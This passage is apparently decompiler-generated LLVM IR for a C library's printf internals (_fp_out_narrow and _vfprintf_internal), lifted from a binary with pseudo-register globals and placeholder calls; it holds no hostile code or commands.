  %v1_13a34 = phi i32 [ 0, %entry ], [ %v1_13a34.pre, %dec_label_pc_13a34.loopexit ]
  %v0_13a34 = phi i32 [ 0, %entry ], [ %v0_13a34.ph, %dec_label_pc_13a34.loopexit ]
  %v2_13a34 = sub i32 %v1_13a34, %v0_13a34
  store i32 %v3_139f0, i32* @r4, align 4
  store i32 %v6_139f0, i32* @r5, align 4
  store i32 %v9_139f0, i32* @r6, align 4
  store i32 %v12_139f0, i32* @r7, align 4
  ret i32 %v2_13a34

; uselistorder directives
  uselistorder i32 %v1_13a10, { 1, 0 }
  uselistorder label %dec_label_pc_13a34.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_13a28, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13a44 = load i32, i32* @r4, align 4
  store i32 %v3_13a44, i32* %stack_var_-24, align 4
  %v6_13a44 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_13a4c = and i32 %arg2, 128
  %v2_13a4c = icmp eq i32 %v1_13a4c, 0
  %v0_13a50 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13a50, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_13a4c, label %dec_label_pc_13aa0thread-pre-split, label %dec_label_pc_13a64

dec_label_pc_13a64:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_13a68 = call i32 @strlen(i8* %arg4)
  store i32 %v3_13a68, i32* %r0.global-to-local, align 4
  %v1_13a6c = load i32, i32* %r4.global-to-local, align 4
  %v2_13a6c = sub i32 %v1_13a6c, %v3_13a68
  store i32 %v2_13a6c, i32* @r4, align 4
  store i32 %v3_13a68, i32* @r6, align 4
  %tmp13 = icmp slt i32 %v2_13a6c, 1
  br i1 %tmp13, label %.thread, label %dec_label_pc_13a80

.thread:                                          ; preds = %dec_label_pc_13a64
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13a9c

dec_label_pc_13a80:                               ; preds = %dec_label_pc_13a64
  %v0_13a80 = load i32, i32* @r5, align 4
  %v1_13a80 = urem i32 %v0_13a80, 128
  %v0_13a84 = load i32, i32* @r8, align 4
  store i32 %v0_13a84, i32* %r0.global-to-local, align 4
  %v3_13a8c = trunc i32 %v1_13a80 to i8
  %v4_13a8c = call i32 @_charpad(i32 %v0_13a84, i8 %v3_13a8c, i32 %v2_13a6c)
  store i32 %v4_13a8c, i32* %r0.global-to-local, align 4
  %v1_13a90 = load i32, i32* @r4, align 4
  %v9_13a90 = icmp eq i32 %v4_13a8c, %v1_13a90
  store i32 %v4_13a8c, i32* %r5.global-to-local, align 4
  br i1 %v9_13a90, label %dec_label_pc_13a80.dec_label_pc_13a9c_crit_edge, label %dec_label_pc_13abc

dec_label_pc_13a80.dec_label_pc_13a9c_crit_edge:  ; preds = %dec_label_pc_13a80
  %v0_13a9c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13a9c

dec_label_pc_13a9c:                               ; preds = %.thread, %dec_label_pc_13a80.dec_label_pc_13a9c_crit_edge
  %v0_13a9c = phi i32 [ %v0_13a9c.pre, %dec_label_pc_13a80.dec_label_pc_13a9c_crit_edge ], [ %v3_13a68, %.thread ]
  store i32 %v0_13a9c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13aa0

dec_label_pc_13aa0thread-pre-split:               ; preds = %entry
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13aa0

dec_label_pc_13aa0:                               ; preds = %dec_label_pc_13aa0thread-pre-split, %dec_label_pc_13a9c
  %v5_13aac = phi i32 [ %arg3, %dec_label_pc_13aa0thread-pre-split ], [ %v0_13a9c, %dec_label_pc_13a9c ]
  %tmp14 = icmp slt i32 %v5_13aac, 1
  br i1 %tmp14, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_13aa0
  br label %bb15

bb:                                               ; preds = %dec_label_pc_13aa0
  %v5_13aa8 = load i32, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_13aa8, %bb ]
  %tmp16 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp16, i32 ptrtoint (i32* @global_var_19604.879 to i32))
  %v0_13ab8 = load i32, i32* %r5.global-to-local, align 4
  %v2_13ab8 = add i32 %storemerge, %v0_13ab8
  store i32 %v2_13ab8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13abc

dec_label_pc_13abc:                               ; preds = %dec_label_pc_13a80, %bb15
  %v0_13abc = phi i32 [ %v4_13a8c, %dec_label_pc_13a80 ], [ %v2_13ab8, %bb15 ]
  store i32 %v0_13abc, i32* %r0.global-to-local, align 4
  %v2_13ac0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13ac0, i32* %r4.global-to-local, align 4
  store i32 %v6_13a44, i32* %r5.global-to-local, align 4
  ret i32 %v0_13abc

; uselistorder directives
  uselistorder i32 %v0_13abc, { 1, 0 }
  uselistorder i32 %v0_13a9c, { 1, 0 }
  uselistorder i32 %v2_13a6c, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_13abc, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_13a9c, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_3()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_3()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v6_13ac8 = load i32, i32* @r5, align 4
  %v12_13ac8 = load i32, i32* @r7, align 4
  %v18_13ac8 = load i32, i32* @sb, align 4
  %v21_13ac8 = load i32, i32* @sl, align 4
  %v24_13ac8 = load i32, i32* @fp, align 4
  %v2_13ad0 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_13ad0, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_13ad0, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_13ae0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_13ae0, i32* @r5, align 4
  %v2_13ae4 = call i32 @_ppfs_init(i32* nonnull %stack_var_-352)
  store i32 %v2_13ae4, i32* %r0.global-to-local, align 4
  %v1_13aec = icmp slt i32 %v2_13ae4, 0
  br i1 %v1_13aec, label %dec_label_pc_13afc, label %dec_label_pc_13b30

dec_label_pc_13afc:                               ; preds = %entry
  %v3_13afc = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_13afc, i32* @r4, align 4
  %v1_13b00 = inttoptr i32 %v3_13afc to i8*
  store i32 %v3_13afc, i32* %r0.global-to-local, align 4
  %v3_13b04 = call i32 @strlen(i8* %v1_13b00)
  store i32 %v3_13b04, i32* %r0.global-to-local, align 4
  %v2_13b08 = icmp eq i32 %v3_13b04, 0
  br i1 %v2_13b08, label %bb, label %dec_label_pc_13b18

bb:                                               ; preds = %dec_label_pc_13afc
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14180

dec_label_pc_13b18:                               ; preds = %dec_label_pc_13afc
  %v0_13b18 = load i32, i32* @r4, align 4
  store i32 %v0_13b18, i32* %r0.global-to-local, align 4
  %v0_13b1c = load i32, i32* @fp, align 4
  store i32 %v0_13b1c, i32* %r2.global-to-local, align 4
  %v3_13b20 = inttoptr i32 %v0_13b1c to i16*
  %v4_13b20 = call i32 @__stdio_fwrite(i32 %v0_13b18, i32 %v3_13b04, i16* %v3_13b20)
  store i32 %v4_13b20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14180

dec_label_pc_13b30:                               ; preds = %entry
  %v0_13b30 = load i32, i32* @r5, align 4
  store i32 %v2_13ad0, i32* %r0.global-to-local, align 4
  %v2_13b38 = call i32 @_ppfs_prepargs(i32 %v2_13ad0, i32 %v0_13b30)
  store i32 %v2_13b38, i32* %r0.global-to-local, align 4
  store i32 1004, i32* @ip, align 4
  %v0_13b80 = load i32, i32* @r4, align 4
  store i32 %v0_13b80, i32* %r2.global-to-local, align 4
  %v1_13c04 = bitcast i32* %stack_var_-352 to i8*
  %v4_13c14 = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_13c20 = ptrtoint i32* %stack_var_-272 to i32
  %v2_13c38 = ptrtoint i32* %stack_var_-40 to i32
  %v2_13c54 = icmp eq i32 %tmp104, 0
  %v2_13f8c = ptrtoint i32* %stack_var_-200 to i32
  %v2_13fd0 = ptrtoint i32* %stack_var_-348 to i32
  %v2_13fd4 = ptrtoint i32* %stack_var_-72 to i32
  %v2_13e88 = ptrtoint i32* %stack_var_-44 to i32
  %v2_13e94 = ptrtoint i32* %stack_var_-52 to i32
  %v7_13cf0 = zext i8 %tmp102 to i32
  %v2_13d28 = ptrtoint i32* %stack_var_-73 to i32
  %v1_13d30 = bitcast i32* %stack_var_-73 to i8*
  %v2_13d38 = icmp ugt i32 %tmp104, 4
  %v7_13d38 = icmp eq i32 %tmp104, 5
  %v7_13c1c = ptrtoint i32* %stack_var_-280 to i32
  %v5_13c4c195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_13e5c = icmp ugt i32 %tmp104, 16
  %v7_13e5c = icmp eq i32 %tmp104, 17
  %v2_13e60 = xor i1 %v7_13e5c, true
  %v3_13e60 = and i1 %v2_13e5c, %v2_13e60
  %v2_13ee4 = icmp ugt i32 %tmp104, 18
  %v7_13ee4 = icmp eq i32 %tmp104, 19
  %v2_13ee8 = xor i1 %v7_13ee4, true
  %v3_13ee8 = and i1 %v2_13ee4, %v2_13ee8
  %v7_13f80 = icmp eq i32 %tmp104, 20
  %v1_13c98 = add i32 %tmp104, add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -38457)
  %v2_13c98 = inttoptr i32 %v1_13c98 to i8*
  %v2_13cc4 = xor i1 %v7_13d38, true
  %v3_13cc4 = and i1 %v2_13d38, %v2_13cc4
  %v7_13cf8 = icmp eq i32 %tmp104, 1
  %v2_13d40 = xor i1 %v2_13d38, true
  %v3_13d40 = or i1 %v7_13d38, %v2_13d40
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_13da8 = icmp eq i32 %tmp104, 3
  %v11_13db4 = icmp eq i32 %tmp104, 4
  %v9_13c24 = mul nuw nsw i32 %v4_13c14, 8
  %v10_13c24 = add i32 %v7_13c1c, %v9_13c24
  br label %dec_label_pc_13b84.outer

dec_label_pc_13b84.outer:                         ; preds = %dec_label_pc_14164, %dec_label_pc_13b30
  %v0_13b8445 = phi i32 [ %v3_14164, %dec_label_pc_14164 ], [ %v0_13b80, %dec_label_pc_13b30 ]
  %v0_13cb8 = phi i32 [ %stack_var_-336.4, %dec_label_pc_14164 ], [ %tmp103, %dec_label_pc_13b30 ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_14164 ], [ 0, %dec_label_pc_13b30 ]
  br label %dec_label_pc_13b84.outer36

dec_label_pc_13b84.outer36:                       ; preds = %dec_label_pc_13b84.outer, %dec_label_pc_14170
  %v0_13b8444 = phi i32 [ %v0_13b8445, %dec_label_pc_13b84.outer ], [ %v1_14170, %dec_label_pc_14170 ]
  %v5_13bb0 = phi i32 [ %v0_13b8445, %dec_label_pc_13b84.outer ], [ %v1_13be0, %dec_label_pc_14170 ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_13b84.outer ], [ %v1_14050, %dec_label_pc_14170 ]
  %v1_13b84188 = inttoptr i32 %v0_13b8444 to i8*
  %v2_13b84189 = load i8, i8* %v1_13b84188, align 1
  %v2_13b88191 = icmp eq i8 %v2_13b84189, 0
  br i1 %v2_13b88191, label %dec_label_pc_13ba0, label %bb138

bb138:                                            ; preds = %dec_label_pc_13b84.outer36, %.thread6
  %v2_13b84193 = phi i8 [ %v2_13b84, %.thread6 ], [ %v2_13b84189, %dec_label_pc_13b84.outer36 ]
  %v1_13b98192 = phi i32 [ %v2_13b98, %.thread6 ], [ %v0_13b8444, %dec_label_pc_13b84.outer36 ]
  %v8_13b8c = icmp eq i8 %v2_13b84193, 37
  br i1 %v8_13b8c, label %dec_label_pc_13ba0, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_13b98 = add i32 %v1_13b98192, 1
  store i32 %v2_13b98, i32* @r4, align 4
  %v1_13b84 = inttoptr i32 %v2_13b98 to i8*
  %v2_13b84 = load i8, i8* %v1_13b84, align 1
  %v2_13b88 = icmp eq i8 %v2_13b84, 0
  br i1 %v2_13b88, label %dec_label_pc_13ba0, label %bb138

dec_label_pc_13ba0:                               ; preds = %bb138, %.thread6, %dec_label_pc_13b84.outer36
  %v1_13b98.lcssa = phi i32 [ %v0_13b8444, %dec_label_pc_13b84.outer36 ], [ %v2_13b98, %.thread6 ], [ %v1_13b98192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_13ba0 = sub i32 %v1_13b98.lcssa, %v5_13bb0
  %v9_13ba0 = icmp eq i32 %v1_13b98.lcssa, %v5_13bb0
  br i1 %v9_13ba0, label %dec_label_pc_13bd4, label %dec_label_pc_13ba8

dec_label_pc_13ba8:                               ; preds = %dec_label_pc_13ba0
  store i32 %v2_13ba0, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_13ba0, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_13ba8
  store i32 %v5_13bb0, i32* %r0.global-to-local, align 4
  %v5_13bb8 = load i32, i32* @fp, align 4
  store i32 %v5_13bb8, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_13ba8, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_13ba8 ]
  store i32 80832, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_19604.879 to i32))
  %v0_13bc0 = load i32, i32* %r0.global-to-local, align 4
  %v1_13bc0 = load i32, i32* @r5, align 4
  %v9_13bc0 = icmp eq i32 %v0_13bc0, %v1_13bc0
  br i1 %v9_13bc0, label %dec_label_pc_13bc8, label %dec_label_pc_14178

dec_label_pc_13bc8:                               ; preds = %bb142
  %v2_13bcc = add i32 %v0_13bc0, %stack_var_-356.1.ph37
  store i32 %v2_13bcc, i32* @ip, align 4
  %v0_13bd4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13bd4

dec_label_pc_13bd4:                               ; preds = %dec_label_pc_13ba0, %dec_label_pc_13bc8
  %v0_13be8 = phi i32 [ %v5_13bb0, %dec_label_pc_13ba0 ], [ %v0_13bd4.pre, %dec_label_pc_13bc8 ]
  %v1_14050 = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_13ba0 ], [ %v2_13bcc, %dec_label_pc_13bc8 ]
  %v1_13bd4 = inttoptr i32 %v0_13be8 to i8*
  %v2_13bd4 = load i8, i8* %v1_13bd4, align 1
  %v2_13bd8 = icmp eq i8 %v2_13bd4, 0
  br i1 %v2_13bd8, label %dec_label_pc_14180, label %dec_label_pc_13be0

dec_label_pc_13be0:                               ; preds = %dec_label_pc_13bd4
  %v1_13be0 = add i32 %v0_13be8, 1
  %v2_13be0 = inttoptr i32 %v1_13be0 to i8*
  %v3_13be0 = load i8, i8* %v2_13be0, align 1
  %v7_13be4 = icmp eq i8 %v3_13be0, 37
  store i32 %v1_13be0, i32* %r2.global-to-local, align 4
  br i1 %v7_13be4, label %dec_label_pc_14170, label %dec_label_pc_13bf0

dec_label_pc_13bf0:                               ; preds = %dec_label_pc_13be0
  store i32 %v2_13ad0, i32* @r4, align 4
  store i32 %v2_13ad0, i32* %r0.global-to-local, align 4
  store i32 %v1_13be0, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_13c04 = call i32 @_ppfs_parsespec(i8* %v1_13c04)
  store i32 %v2_13ad0, i32* @r0, align 4
  %v0_13c0c = call i32 @_ppfs_setargs()
  store i32 %v0_13c0c, i32* %r0.global-to-local, align 4
  store i32 %v4_13c14, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_13bf0
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_13bf0, %bb145
  %storemerge = phi i32 [ %v10_13c24, %bb145 ], [ %v7_13c20, %dec_label_pc_13bf0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_13c4c195, label %dec_label_pc_13c30, label %dec_label_pc_13c50

dec_label_pc_13c30:                               ; preds = %bb146, %dec_label_pc_13c30
  %v5_13c3c197 = phi i32 [ %v5_13c3c, %dec_label_pc_13c30 ], [ %v2_13c38, %bb146 ]
  %v0_13c30196 = phi i32 [ %v1_13c34, %dec_label_pc_13c30 ], [ %storemerge, %bb146 ]
  %v2_13c30 = add i32 %v5_13c3c197, -32
  %v3_13c30 = inttoptr i32 %v2_13c30 to i32*
  store i32 %v0_13c30196, i32* %v3_13c30, align 4
  %v0_13c34 = load i32, i32* %r0.global-to-local, align 4
  %v1_13c34 = add i32 %v0_13c34, 8
  store i32 %v1_13c34, i32* %r0.global-to-local, align 4
  %v1_13c3c.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_13c3c = mul i32 %v1_13c3c.pre, 4
  %v5_13c3c = add i32 %v4_13c3c, %v2_13c38
  %v1_13c48 = add i32 %v1_13c3c.pre, 1
  store i32 %v1_13c48, i32* %r2.global-to-local, align 4
  %v5_13c4c = icmp slt i32 %v1_13c3c.pre, %tmp105
  br i1 %v5_13c4c, label %dec_label_pc_13c30, label %dec_label_pc_13c50

dec_label_pc_13c50:                               ; preds = %dec_label_pc_13c30, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_13c54, label %dec_label_pc_13c5c, label %dec_label_pc_13c80

dec_label_pc_13c5c:                               ; preds = %dec_label_pc_13c50
  %v3_13c5c = load i32, i32* %stack_var_-72, align 4
  store i32 %v1_14050, i32* @ip, align 4
  %v1_13c68 = inttoptr i32 %v3_13c5c to i32*
  %v2_13c68 = load i32, i32* %v1_13c68, align 4
  store i32 %v2_13c68, i32* %r0.global-to-local, align 4
  %v1_13c6c = and i32 %v0_13cb8, 3840
  store i32 %v1_14050, i32* %r2.global-to-local, align 4
  %v3_13c74 = ashr i32 %v1_14050, 31
  %v4_13c78 = inttoptr i32 %v2_13c68 to i16*
  %v5_13c78 = call i32 @_store_inttype(i16* %v4_13c78, i32 %v1_13c6c, i32 %v1_14050, i32 %v3_13c74)
  store i32 %v5_13c78, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14164

dec_label_pc_13c80:                               ; preds = %dec_label_pc_13c50
  br i1 %tmp207, label %dec_label_pc_13e1c, label %dec_label_pc_13c88

dec_label_pc_13c88:                               ; preds = %dec_label_pc_13c80
  %v3_13c98 = load i8, i8* %v2_13c98, align 1
  %v4_13c98 = zext i8 %v3_13c98 to i32
  %v7_13c9c = icmp eq i8 %v3_13c98, 10
  br i1 %v7_13c9c, label %dec_label_pc_13ca8, label %bb147

bb147:                                            ; preds = %dec_label_pc_13c88
  br label %bb151

dec_label_pc_13ca8:                               ; preds = %dec_label_pc_13c88
  %v1_13cb8 = and i32 %v0_13cb8, 64
  %v2_13cb8 = icmp eq i32 %v1_13cb8, 0
  br i1 %v2_13cb8, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_13ca8
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_13ca8, %bb150
  br i1 %v3_13cc4, label %.thread, label %dec_label_pc_13ccc

.thread:                                          ; preds = %bb151
  %v5_13cc4 = sub nsw i32 0, %v4_13c98
  br label %dec_label_pc_13ce4

dec_label_pc_13ccc:                               ; preds = %bb151
  br i1 %v7_13da8, label %bb152, label %dec_label_pc_13cd8

bb152:                                            ; preds = %dec_label_pc_13ccc
  br label %dec_label_pc_13ce4

dec_label_pc_13cd8:                               ; preds = %dec_label_pc_13ccc
  br i1 %v7_13cf8, label %dec_label_pc_13ce8, label %dec_label_pc_13ce4

dec_label_pc_13ce4:                               ; preds = %.thread, %bb152, %dec_label_pc_13cd8
  %v0_13d1081 = phi i32 [ %v5_13cc4, %.thread ], [ %v4_13c98, %bb152 ], [ %v4_13c98, %dec_label_pc_13cd8 ]
  br label %dec_label_pc_13ce8

dec_label_pc_13ce8:                               ; preds = %dec_label_pc_13cd8, %dec_label_pc_13ce4
  %v0_13d1080 = phi i32 [ %v0_13d1081, %dec_label_pc_13ce4 ], [ %v4_13c98, %dec_label_pc_13cd8 ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_13ce4 ], [ 6, %dec_label_pc_13cd8 ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_13ce8 = load i32, i32* %stack_var_-348, align 4
  %v1_13cec = icmp slt i32 %v3_13ce8, 0
  %v7_13cf0. = select i1 %v1_13cec, i32 %v7_13cf0, i32 32
  store i32 %v7_13cf0., i32* @sb, align 4
  br i1 %v7_13cf8, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_13ce8
  store i32 %v2_13c38, i32* %r2.global-to-local, align 4
  %v2_13d00 = load i32, i32* @ip, align 4
  %v5_13d00 = mul i32 %v2_13d00, 4
  %v6_13d00 = add i32 %v5_13d00, %v2_13c38
  %v2_13d04 = add i32 %v6_13d00, -276
  %v3_13d04 = inttoptr i32 %v2_13d04 to i32*
  %v4_13d04 = load i32, i32* %v3_13d04, align 4
  %v2_13d0c = and i32 %v4_13d04, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_13ce8, %.thread15
  %storemerge93 = phi i32 [ %v2_13d0c, %.thread15 ], [ 1024, %dec_label_pc_13ce8 ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_13d1080, i32* @r2, align 4
  %v3_13d14 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_13d14, i32* @r1, align 4
  %v0_13d18 = call i32 @_load_inttype()
  store i32 %v0_13d18, i32* @r2, align 4
  %v0_13d24 = load i32, i32* @r1, align 4
  store i32 %v0_13d24, i32* @r3, align 4
  store i32 %v2_13d28, i32* %r0.global-to-local, align 4
  %v2_13d30 = call i32 @_uintmaxtostr(i8* %v1_13d30)
  store i32 %v2_13d30, i32* %r0.global-to-local, align 4
  store i32 %v2_13d30, i32* @r4, align 4
  br i1 %v3_13d40, label %bb160, label %dec_label_pc_13d44

dec_label_pc_13d44:                               ; preds = %bb157
  %v3_13d30 = inttoptr i32 %v2_13d30 to i8*
  %v3_13d44 = load i8, i8* %v3_13d30, align 1
  %v7_13d48 = icmp eq i8 %v3_13d44, 45
  %v2_13d50 = or i32 %v0_13cb8, 2
  %v2_13d50.stack_var_-336.0 = select i1 %v7_13d48, i32 %v2_13d50, i32 %v0_13cb8
  br i1 %v7_13d48, label %.thread17, label %dec_label_pc_13d64

.thread17:                                        ; preds = %dec_label_pc_13d44
  %v3_13d54 = add i32 %v2_13d30, 1
  store i32 %v3_13d54, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_13d64:                               ; preds = %dec_label_pc_13d44
  %v1_13d64 = and i32 %v2_13d50.stack_var_-336.0, 2
  %v2_13d64 = icmp eq i32 %v1_13d64, 0
  br i1 %v2_13d64, label %dec_label_pc_13d70, label %bb158

bb158:                                            ; preds = %dec_label_pc_13d64
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_13d70:                               ; preds = %dec_label_pc_13d64
  %v1_13d70 = urem i32 %v2_13d50.stack_var_-336.0, 2
  %v2_13d70 = icmp eq i32 %v1_13d70, 0
  br i1 %v2_13d70, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_13d70
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_13d70, %bb159
  %v0_13dcc = phi i32 [ %v2_13d30, %bb157 ], [ %v3_13d54, %.thread17 ], [ %v2_13d30, %dec_label_pc_13d70 ], [ %v2_13d30, %bb159 ], [ %v2_13d30, %bb158 ]
  %v0_13d88 = phi i32 [ %v0_13cb8, %bb157 ], [ %v2_13d50, %.thread17 ], [ %v0_13cb8, %dec_label_pc_13d70 ], [ %v0_13cb8, %bb159 ], [ %v0_13cb8, %bb158 ]
  %v3_13d78 = load i32, i32* %stack_var_-348, align 4
  %v1_13d80 = icmp slt i32 %v3_13d78, 0
  br i1 %v1_13d80, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_13d78, %bb160 ]
  %v0_13db0 = phi i32 [ 1, %bb161 ], [ %v3_13d78, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_13d88 = and i32 %v0_13d88, 16
  %v2_13d88 = icmp eq i32 %v1_13d88, 0
  %v2_13d94 = sub i32 %v2_13d28, %v0_13dcc
  store i32 %v2_13d94, i32* @r5, align 4
  br i1 %v2_13d88, label %bb169, label %dec_label_pc_13d9c

dec_label_pc_13d9c:                               ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_13d9c
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_13d9c, %bb163
  br i1 %v7_13da8, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_13db0, %v2_13d94
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_13db4, label %dec_label_pc_13dbc, label %bb169

dec_label_pc_13dbc:                               ; preds = %bb167
  %v1_13dbc = inttoptr i32 %v0_13dcc to i8*
  %v2_13dbc = load i8, i8* %v1_13dbc, align 1
  %v7_13dc0 = icmp eq i8 %v2_13dbc, 48
  br i1 %v7_13dc0, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_13dbc
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_13dbc
  %v2_13dc8 = add i32 %v2_13d94, 1
  store i32 %v2_13dc8, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_13e0c = phi i32 [ %v0_13db0, %bb167 ], [ %v0_13db0, %bb162 ], [ 1, %bb168 ], [ %v2_13dc8, %.thread24 ], [ %v0_13db0, %bb166 ]
  %v1_13dcc = inttoptr i32 %v0_13dcc to i8*
  %v2_13dcc = load i8, i8* %v1_13dcc, align 1
  %v7_13dd0 = icmp eq i8 %v2_13dcc, 48
  br i1 %v7_13dd0, label %dec_label_pc_13dd8, label %dec_label_pc_13e08

dec_label_pc_13dd8:                               ; preds = %bb169
  %v0_13ddc = load i32, i32* @r6, align 4
  %v7_13de0 = icmp slt i32 %v0_13ddc, 6
  br i1 %v7_13de0, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_13dd8
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_13dd8, %bb170
  br i1 %v7_13cf8, label %.thread27, label %dec_label_pc_13dfc

.thread27:                                        ; preds = %bb171
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -38484), i32* @r4, align 4
  br label %dec_label_pc_13e14

dec_label_pc_13dfc:                               ; preds = %bb171
